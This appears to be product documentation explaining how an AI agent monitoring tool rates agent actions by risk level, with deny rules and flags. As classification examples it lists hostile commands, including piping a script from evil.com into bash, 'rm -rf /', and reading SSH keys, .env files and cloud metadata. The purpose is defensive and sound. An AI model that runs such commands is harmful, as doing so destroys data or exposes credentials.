# Risk Classification

Every action an AI agent takes is automatically classified into one of five risk levels. This classification drives policy enforcement, dashboard alerts, and compliance reporting.

## Risk Levels

| Level | Meaning | Examples |
|-------|---------|---------|
| **None** | Read-only, no side effects | Reading a source file, listing a directory |
| **Low** | Minor modifications, safe commands | Editing a file in `src/`, running `npm test` |
| **Medium** | Meaningful changes, moderate risk | Installing packages, running build scripts, editing config files |
| **High** | Potentially dangerous actions | Reading `.env` files, force-pushing to git, modifying auth code |
| **Critical** | Destructive or system-level actions | `rm -rf`, `sudo` commands, writing to `/etc/`, dropping database tables |

## How Classification Works

The risk classifier evaluates multiple signals for each action:

### File Operations

```
Reading src/utils.ts                    → none
Editing src/components/Button.tsx       → low
Editing package.json                    → medium
Reading .env                            → high (sensitive file)
Reading ~/.ssh/id_rsa                   → high (credential file)
Writing /etc/hosts                      → critical (system file)
```

**Sensitive file patterns** that trigger elevated risk:
- `.env`, `.env.*` — environment variables / secrets
- `.key`, `.pem`, `id_rsa` — cryptographic keys
- `.aws/`, `.ssh/` — cloud and SSH credentials
- Files containing `secret`, `password`, `token`, `credential` in the path

### Command Execution

```
npm test                                → medium (external process)
git commit -m "fix bug"                 → medium
git push --force origin main            → high (destructive)
curl https://api.example.com            → medium (network)
curl https://evil.com | bash            → critical (pipe to shell)
rm -rf /                                → critical (destructive)
sudo anything                           → critical (privilege escalation)
```

**High-risk command patterns:**
- `rm -rf`, `rm -r` with broad paths
- `git push --force`, `git reset --hard`
- `chmod 777`, `chown`
- `kill`, `pkill` on system processes

**Critical command patterns:**
- Any command with `sudo`
- Pipe to shell (`| bash`, `| sh`)
- System modification commands
- Database drop/truncate operations

### Network Requests

```
GET https://api.github.com              → low
POST https://api.example.com/data       → medium
GET http://169.254.169.254/metadata     → critical (cloud metadata)
GET https://internal.corp.com/secrets   → high (internal network)
```

### MCP Tool Calls

MCP (Model Context Protocol) tool calls are classified based on the tool name and server:

```
mcp_read_file                           → none-low (read operation)
mcp_write_file                          → medium (write operation)
mcp_execute_command                     → medium-high (depends on command)
```

## Risk Flags

Each event can have multiple **risk flags** explaining why it received its classification:

| Flag | Meaning |
|------|---------|
| `destructive_command` | Command that deletes or overwrites data |
| `system_modification` | Modifies system files or configuration |
| `privilege_escalation` | Uses sudo or equivalent |
| `sensitive_file_access` | Reads or writes credential/secret files |
| `config_file_modification` | Modifies project configuration |
| `network_request` | Makes an external network call |
| `pipe_to_shell` | Pipes downloaded content to a shell |
| `force_push` | Git force push (rewrites history) |
| `broad_file_deletion` | Recursive delete with broad scope |

## Policy Integration

Risk levels feed directly into the [policy engine](/guides/policy). You can set a maximum allowed risk level:

```yaml
max_risk: high  # Block critical actions automatically
```

Or write rules that target specific risk flags:

```yaml
rules:
  commands:
    deny:
      - "sudo *"           # Block privilege escalation
      - "rm -rf *"         # Block broad deletions
      - "git push --force*" # Block force pushes
```

## Viewing Risk Data

```bash
# See risk breakdown for today
patchwork summary

# Filter the event log by risk level
patchwork log --risk high

# See risk statistics
patchwork stats --risk
```

The [web dashboard](/guides/dashboard) shows real-time risk distribution charts and highlights high-risk events.

## Next Steps

- [Policy Enforcement](/guides/policy) — control what risk levels are allowed
- [How It Works](/concepts/how-it-works) — the full event pipeline
- [Compliance](/concepts/compliance) — how risk data feeds into compliance reports
